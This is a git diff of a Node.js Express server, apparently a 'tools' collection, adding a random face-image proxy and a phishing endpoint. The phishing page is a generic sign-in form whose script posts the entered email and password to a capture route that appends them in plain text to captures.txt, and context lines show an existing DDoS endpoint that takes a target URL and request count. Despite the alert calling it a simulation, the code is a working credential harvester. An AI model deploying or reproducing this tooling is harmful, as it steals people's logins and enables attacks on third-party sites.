@@ -1,6 +1,8 @@
 const express = require('express')
 const axios = require('axios');
 const nodemailer = require('nodemailer');
+const fs = require('fs');
+const path = require('path');
 const { faker } = require('@faker-js/faker');
 const app = express()
 const port = 3000
@@ -126,6 +128,19 @@ app.get('/tools/domain-info', authentication, async (req, res) => {
     }
 });
 
+app.get('/tools/random-image', async (req, res) => {
+    try {
+      const imageResponse = await axios.get('https://thispersondoesnotexist.com', {
+        responseType: 'arraybuffer'
+      });
+  
+      res.set('Content-Type', 'image/jpeg');
+      res.send(imageResponse.data);
+    } catch (error) {
+      res.status(500).send('Error generating image');
+    }
+  });
+
 app.post('/tools/ddos', async (req, res) => {
     const { targetUrl, numberOfRequests } = req.body;
 
@@ -168,6 +183,66 @@ app.get('/tools/crawler', async (req, res) => {
         res.status(500).send('Error retrieving information or maximum number of requests reached');
     }
 });
+
+app.get('/tools/phishing', (req, res) => {
+    const html = `
+    <!DOCTYPE html>
+    <html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Login Page</title>
+    </head>
+    <body>
+        <h2>Sign in</h2>
+        <form id="form">
+            <label for="email">Email:</label>
+            <input type="email" id="email" name="email" required>
+            <br>
+            <label for="password">Password:</label>
+            <input type="password" id="password" name="password" required>
+            <br>
+            <button type="submit">Login</button>
+        </form>
+        <script>
+            // Envoyer les données au serveur avec fetch
+            document.querySelector('#form').addEventListener('submit', function(e) {
+                e.preventDefault();
+                const email = document.getElementById('email').value;
+                const password = document.getElementById('password').value;
+                
+                fetch('/tools/phishing/capture', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ email, password })
+                }).then(response => {
+                    if (response.ok) {
+                        alert('Captured Email and Password (Simulation)');
+                    }
+                }).catch(error => console.error('Error:', error));
+            });
+        </script>
+    </body>
+    </html>`;
+    
+    res.send(html);
+});
+
+app.post('/tools/phishing/capture', (req, res) => {
+    const { email, password } = req.body;
+    const data = `Email: ${email}, Password: ${password}\n`;
+
+    fs.appendFile(path.join(__dirname, 'captures.txt'), data, (err) => {
+        if (err) {
+            console.error('Error writing to file', err);
+            return res.sendStatus(500);
+        }
+        res.sendStatus(200);
+    });
+});
+
 
 
 // app.get('/protected-route', authentication, (req, res) => {
